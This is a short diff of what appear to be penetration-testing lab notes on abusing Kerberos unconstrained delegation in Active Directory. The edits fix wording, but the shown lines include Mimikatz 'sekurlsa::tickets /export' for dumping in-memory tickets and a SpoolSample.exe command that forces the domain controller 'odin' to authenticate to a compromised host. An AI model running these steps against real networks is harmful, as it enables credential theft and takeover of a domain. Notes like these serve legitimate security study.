@@ -1390,7 +1390,7 @@ import and execute script
 
 there is 2 device :
 
-pc-win10 unconstrained delegation enabled and comprimised to attacker
+pc-win10 unconstrained delegation enabled and compromised
 
 odin - Domain controller
 
@@ -1415,17 +1415,13 @@ checking delegation rights
 	SID                  : S-1-5-21-3410397846-649609989-2919355437-2124
 	TrustedForDelegation : True
 	UserPrincipalName    :
-
-
-
-	PS C:\Users\Administrator>
 	
 	
-Check in memory TGT with
+Check in memory TGT with, there is no TGT in memory
 
 	sekurlsa::tickets /export
 
-force DC to authenticate pc-win10
+Force DC to authenticate pc-win10
 
 	PS C:\Users\testuser\Desktop> .\SpoolSample.exe odin pc-win10
 	[+] Converted DLL to shellcode
